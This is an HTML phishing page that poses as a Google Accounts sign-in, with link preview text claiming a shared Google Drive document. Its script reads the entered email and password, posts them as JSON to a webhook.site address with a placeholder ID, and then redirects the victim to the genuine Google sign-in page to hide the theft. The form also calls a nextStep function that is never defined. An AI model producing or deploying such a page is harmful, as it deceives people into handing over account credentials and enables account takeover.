<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="Google Drive - Shared Document">
    <meta property="og:description" content="You’ve received a secure shared file. Please sign in to view.">
    <meta property="og:image" content="https://ssl.gstatic.com/docs/doclist/images/infinite_arrow_favicon_5.ico">
    <title>Sign in – Google Accounts</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
    <style>
        body {
            background-color: #fff;
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            width: 360px;
            padding: 40px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #202124;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #1a73e8;
            color: white;
            border: none;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
        }

        .step2 {
            display: none;
        }

        .logo {
            width: 75px;
            display: block;
            margin: 0 auto 30px;
        }

        small {
            color: #5f6368;
            font-size: 12px;
        }
    </style>
</head>

<body>
    <div class="container">
        <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo" class="logo">
        <form onsubmit="return nextStep(event)">
            <div class="step1">
                <h1>Sign in</h1>
                <input type="email" id="email" placeholder="Email or phone" required>
                <button type="submit">Next</button>
            </div>
            <div class="step2">
                <h1>Welcome</h1>
                <input type="password" id="password" placeholder="Enter your password" required>
                <button type="button" onclick="sendData()">Sign In</button>
            </div>
            <small>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></small>
        </form>
    </div>

    <script>
function sendData() {
  const email = document.getElementById('email').value;
  const pass = document.getElementById('password').value;

  fetch("https://webhook.site/YOUR_WEBHOOK_ID", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ email: email, password: pass })
  }).then(() => {
    window.location.href = "https://accounts.google.com/signin";
  });
}

    </script>
</body>

</html>
